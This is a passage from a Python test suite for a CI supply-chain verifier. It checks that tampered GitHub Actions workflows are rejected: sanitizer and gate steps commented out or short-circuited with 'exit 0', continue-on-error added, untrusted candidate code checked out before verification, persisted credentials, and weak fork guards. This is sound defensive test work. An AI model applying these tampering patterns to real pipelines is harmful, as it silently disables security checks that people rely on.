                (root / "ci/scripts").mkdir(parents=True)
                shutil.copy2(
                    SCRIPTS / "linux_security_profile.sh",
                    root / "ci/scripts/linux_security_profile.sh",
                )
                with self.assertRaisesRegex(
                    module.ContractError,
                    r"(?:complete host/container mapping differs|source identity differs)",
                ):
                    module._verify_linux_security_dag(root)

    def test_darwin_security_profiles_are_independent_and_aggregated(self) -> None:
        """Reject no-op profiles, sibling edges, and inactive suite checks."""
        module = self._load_lock_module()
        module._verify_darwin_security_dag(REPO_ROOT)
        workflow_path = REPO_ROOT / ".github/workflows/ci-integration-suite.yml"
        workflow = workflow_path.read_text(encoding="utf-8")
        cases = (
            (
                "sibling-dependency",
                "sanitizer-asan-darwin",
                "    needs: integration-plan\n",
                "    needs: sanitizer-tsan-darwin\n",
                "sanitizer-asan-darwin complete job mapping differs",
            ),
            (
                "missing-gate-dependency",
                "suite-gate",
                "      - fuzz-codecs-darwin\n",
                "",
                "suite-gate complete job mapping differs",
            ),
            (
                "missing-protected-control-dependency",
                "suite-gate",
                "      - build-smoke-control\n",
                "",
                "suite-gate complete job mapping differs",
            ),
            (
                "missing-producer-smoke-result",
                "suite-gate",
                (
                    "          CI_PRODUCER_BUILD_SMOKE_RESULT: "
                    "${{ needs.producer-build-smoke.result }}\n"
                ),
                "",
                "suite-gate complete job mapping differs",
            ),
            (
                "missing-route-digest-result",
                "suite-gate",
                (
                    "          CI_ROUTE_SHA256: "
                    "${{ needs.build-smoke-control.outputs.route_sha256 }}\n"
                ),
                "",
                "suite-gate complete job mapping differs",
            ),
            (
                "tsan-commented-noop",
                "sanitizer-tsan-darwin",
                "        run: bash .ci-darwin-tsan-control/ci/scripts/darwin_security_profile.sh\n",
                (
                    "        run: |\n"
                    "          # bash .ci-darwin-tsan-control/ci/scripts/darwin_security_profile.sh\n"
                    "          :\n"
                ),
                "sanitizer-tsan-darwin complete job mapping differs",
            ),
            (
                "tsan-environment-commented",
                "sanitizer-tsan-darwin",
                "          CI_SECURITY_PROFILE: sanitizer-tsan\n",
                "          # CI_SECURITY_PROFILE: sanitizer-tsan\n",
                "sanitizer-tsan-darwin complete job mapping differs",
            ),
            (
                "candidate-before-verification",
                "sanitizer-asan-darwin",
                "      - name: Verify exact Darwin ASan host runner\n",
                (
                    "      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4\n"
                    "        name: Unexpected candidate checkout before verification\n"
                    "        with:\n"
                    "          persist-credentials: false\n"
                    "          repository: ${{ inputs.checkout_repository }}\n"
                    "          ref: ${{ inputs.checkout_ref }}\n"
                    "      - name: Verify exact Darwin ASan host runner\n"
                ),
                "sanitizer-asan-darwin complete job mapping differs",
            ),
            (
                "profile-continue-on-error",
                "sanitizer-asan-darwin",
                "        run: bash .ci-darwin-asan-control/ci/scripts/darwin_security_profile.sh\n",
                (
                    "        run: bash .ci-darwin-asan-control/ci/scripts/darwin_security_profile.sh\n"
                    "        continue-on-error: true\n"
                ),
                "sanitizer-asan-darwin complete job mapping differs",
            ),
            (
                "runner-verification-extra-if",
                "sanitizer-asan-darwin",
                (
                    "      - name: Verify exact Darwin ASan host runner\n"
                    "        env:\n"
                    "          CI_RUNNER_IDENTITY_FILE: ${{ runner.temp }}/photospider-darwin-asan-runner-${{ github.run_id }}-${{ github.run_attempt }}.json\n"
                    "          PYTHONDONTWRITEBYTECODE: \"1\"\n"
                    "        run: >-\n"
                ),
                (
                    "      - name: Verify exact Darwin ASan host runner\n"
                    "        env:\n"
                    "          CI_RUNNER_IDENTITY_FILE: ${{ runner.temp }}/photospider-darwin-asan-runner-${{ github.run_id }}-${{ github.run_attempt }}.json\n"
                    "          PYTHONDONTWRITEBYTECODE: \"1\"\n"
                    "        if: always()\n"
                    "        run: >-\n"
                ),
                "sanitizer-asan-darwin complete job mapping differs",
            ),
            (
                "download-extra-with",
                "fuzz-codecs-darwin",
                "          path: .ci-darwin-fuzz-inventory\n",
                (
                    "          path: .ci-darwin-fuzz-inventory\n"
                    "          merge-multiple: true\n"
                ),
                "fuzz-codecs-darwin complete job mapping differs",
            ),
            (
                "upload-extra-shell",
                "sanitizer-tsan-darwin",
                "        if: always()\n",
                "        if: always()\n        shell: bash\n",
                "sanitizer-tsan-darwin complete job mapping differs",
            ),
            (
                "candidate-profile-script",
                "fuzz-codecs-darwin",
                "        run: bash .ci-darwin-fuzz-control/ci/scripts/darwin_security_profile.sh\n",
                "        run: bash .ci-darwin-fuzz-candidate/ci/scripts/fuzz_smoke.sh\n",
                "fuzz-codecs-darwin complete job mapping differs",
            ),
            (
                "control-commit-from-candidate",
                "sanitizer-asan-darwin",
                "          ref: ${{ inputs.workflow_commit }}\n",
                "          ref: ${{ inputs.checkout_ref }}\n",
                "sanitizer-asan-darwin complete job mapping differs",
            ),
            (
                "overlapping-candidate-root",
                "sanitizer-tsan-darwin",
                "          CI_CANDIDATE_ROOT: ${{ github.workspace }}/.ci-darwin-tsan-candidate\n",
                "          CI_CANDIDATE_ROOT: ${{ github.workspace }}/.ci-darwin-tsan-control\n",
                "sanitizer-tsan-darwin complete job mapping differs",
            ),
            (
                "missing-candidate-head-binding",
                "sanitizer-asan-darwin",
                "          CI_CANDIDATE_COMMIT: ${{ inputs.candidate_commit }}\n",
                "",
                "sanitizer-asan-darwin complete job mapping differs",
            ),
            (
                "gate-result-binding-commented",
                "suite-gate",
                (
                    "          CI_DARWIN_ASAN_RESULT: "
                    "${{ needs.sanitizer-asan-darwin.result }}\n"
                ),
                (
                    "          # CI_DARWIN_ASAN_RESULT: "
                    "${{ needs.sanitizer-asan-darwin.result }}\n"
                ),
                "suite-gate complete job mapping differs",
            ),
            (
                "gate-call-commented-noop",
                "suite-gate",
                (
                    "        run: >-\n"
                    "          python3 .ci-suite-gate-control/ci/scripts/"
                    "integration_suite_gate.py\n"
                    "          --output \"$GITHUB_OUTPUT\"\n"
                ),
                (
                    "        run: |\n"
                    "          # python3 .ci-suite-gate-control/ci/scripts/"
                    "integration_suite_gate.py --output \"$GITHUB_OUTPUT\"\n"
                    "          :\n"
                ),
                "suite-gate complete job mapping differs",
            ),
            (
                "gate-early-exit",
                "suite-gate",
                (
                    "        run: >-\n"
                    "          python3 .ci-suite-gate-control/ci/scripts/"
                    "integration_suite_gate.py\n"
                    "          --output \"$GITHUB_OUTPUT\"\n"
                ),
                (
                    "        run: |\n"
                    "          exit 0\n"
                    "          python3 .ci-suite-gate-control/ci/scripts/"
                    "integration_suite_gate.py --output \"$GITHUB_OUTPUT\"\n"
                ),
                "suite-gate complete job mapping differs",
            ),
            (
                "gate-extra-step",
                "suite-gate",
                "      - name: Aggregate the exact shared integration DAG\n",
                (
                    "      - name: Unexpected gate step\n"
                    "        run: true\n"
                    "      - name: Aggregate the exact shared integration DAG\n"
                ),
                "suite-gate complete job mapping differs",
            ),
            (
                "gate-attestation-env-deleted",
                "suite-gate",
                (
                    "          CI_ATTESTATION_RESULT: "
                    "${{ needs.attest-targeted-artifacts.result }}\n"
                ),
                "",
                "suite-gate complete job mapping differs",
            ),
        )
        for label, job_name, original, replacement, diagnostic in cases:
            with self.subTest(
                darwin_dag_drift=label
            ), tempfile.TemporaryDirectory() as temporary_text:
                root = Path(temporary_text)
                workflow_root = root / ".github/workflows"
                workflow_root.mkdir(parents=True)
                lock_root = root / "ci/locks"
                lock_root.mkdir(parents=True)
                shutil.copy2(
                    REPO_ROOT / "ci/locks/actions.lock",
                    lock_root / "actions.lock",
                )
                script_root = root / "ci/scripts"
                script_root.mkdir(parents=True)
                shutil.copy2(
                    SCRIPTS / "darwin_security_profile.sh",
                    script_root / "darwin_security_profile.sh",
                )
                mutated = self._replace_workflow_job_fragment(
                    workflow, job_name, original, replacement
                )
                (workflow_root / "ci-integration-suite.yml").write_text(
                    mutated, encoding="utf-8"
                )
                with self.assertRaises(module.ContractError) as raised:
                    module._verify_darwin_security_dag(root)
                self.assertIn(diagnostic, str(raised.exception))

        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            workflow_root = root / ".github/workflows"
            workflow_root.mkdir(parents=True)
            shutil.copy2(workflow_path, workflow_root / workflow_path.name)
            lock_root = root / "ci/locks"
            lock_root.mkdir(parents=True)
            shutil.copy2(
                REPO_ROOT / "ci/locks/actions.lock", lock_root / "actions.lock"
            )
            script_root = root / "ci/scripts"
            script_root.mkdir(parents=True)
            wrapper = (SCRIPTS / "darwin_security_profile.sh").read_text(
                encoding="utf-8"
            )
            (script_root / "darwin_security_profile.sh").write_text(
                wrapper.replace(
                    'bash "$control_root/$profile_script"',
                    'bash "$candidate_root/$profile_script"',
                ),
                encoding="utf-8",
            )
            with self.assertRaisesRegex(
                module.ContractError, "verifier-owned source identity differs"
            ):
                module._verify_darwin_security_dag(root)

    def test_unpinned_yaml_workflow_fails_the_same_lock_parser(self) -> None:
        """Reject an unpinned action in the formerly omitted YAML suffix."""
        module = self._load_lock_module()
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            workflow_root = root / ".github/workflows"
            workflow_root.mkdir(parents=True)
            (workflow_root / "unpinned.yaml").write_text(
                "jobs:\n"
                "  test:\n"
                "    runs-on: ubuntu-24.04\n"
                "    steps:\n"
                "      - uses: actions/checkout@v4 # v4\n",
                encoding="utf-8",
            )
            locked_commit = "1" * 40
            with self.assertRaises(module.ContractError) as raised:
                module._verify_workflows(
                    root, {"actions/checkout": ("v4", locked_commit)}
                )
            self.assertIn(f"uses v4, expected {locked_commit}", str(raised.exception))

    def test_checkout_credentials_must_be_explicitly_nonpersistent(self) -> None:
        """Reject pinned checkout steps that omit or enable persisted tokens."""
        module = self._load_lock_module()
        locked_commit = "1" * 40
        for credential_input in (
            "",
            "          persist-credentials: true\n",
            "        env:\n          persist-credentials: false\n",
        ):
            with self.subTest(credential_input=credential_input), tempfile.TemporaryDirectory() as temporary_text:
                root = Path(temporary_text)
                workflow_root = root / ".github/workflows"
                workflow_root.mkdir(parents=True)
                (workflow_root / "checkout.yml").write_text(
                    "jobs:\n"
                    "  test:\n"
                    "    runs-on: ubuntu-24.04\n"
                    "    steps:\n"
                    f"      - uses: actions/checkout@{locked_commit} # v4\n"
                    "        with:\n"
                    + credential_input,
                    encoding="utf-8",
                )
                with self.assertRaises(module.ContractError) as raised:
                    module._verify_workflows(
                        root, {"actions/checkout": ("v4", locked_commit)}
                    )
                self.assertIn("persist-credentials: false", str(raised.exception))

    def test_pull_request_target_requires_universal_precheckout_fork_guard(self) -> None:
        """Reject a pull-request-target guard limited to protected branch names."""
        module = self._load_lock_module()
        lines = (
            "on:\n"
            "  pull_request_target:\n"
            "jobs:\n"
            "  protected-ci-paths:\n"
            "    steps:\n"
            "      - name: Reject fork pull request before checkout\n"
            "        if: github.event_name == 'pull_request_target' && "
            "startsWith(github.head_ref, 'CI/') && "
            "github.event.pull_request.head.repo.full_name != github.repository\n"
            "        run: echo 'Fork pull requests are rejected before checkout.'\n"
            "      - uses: actions/checkout@1111111111111111111111111111111111111111 # v4\n"
        ).splitlines()
        with self.assertRaises(module.ContractError) as raised:
            module._verify_pull_request_target_trust(Path("fork.yml"), lines)
        self.assertIn("incorrectly limited to CI/**", str(raised.exception))

    def test_workflow_inventory_rejects_links_specials_and_unknown_entries(self) -> None:
        """Reject every noncanonical directory entry before YAML parsing."""
        module = self._load_lock_module()
        cases = ("symlink", "fifo", "directory", "unknown-extension")
        for unsafe_kind in cases:
            with self.subTest(unsafe_kind=unsafe_kind), tempfile.TemporaryDirectory() as temporary_text:
                root = Path(temporary_text)
                workflow_root = root / ".github/workflows"
                workflow_root.mkdir(parents=True)
                if unsafe_kind == "symlink":
                    outside = root / "outside.yml"
                    outside.write_text("jobs: {}\n", encoding="utf-8")
                    (workflow_root / "unsafe.yml").symlink_to(outside)
                elif unsafe_kind == "fifo":
                    os.mkfifo(workflow_root / "unsafe.yaml")
                elif unsafe_kind == "directory":
                    (workflow_root / "nested.yml").mkdir()
                else:
                    (workflow_root / "README.md").write_text("unexpected\n", encoding="utf-8")
                with self.assertRaises(module.ContractError):
                    module._workflow_files(root)

    def test_repository_lock_surface_is_exact(self) -> None:
        """Reject no active floating actions, runners, images, or install inputs."""
        run_command(sys.executable, SCRIPTS / "ci_lock_verify.py")


if __name__ == "__main__":
    unittest.main(verbosity=2)
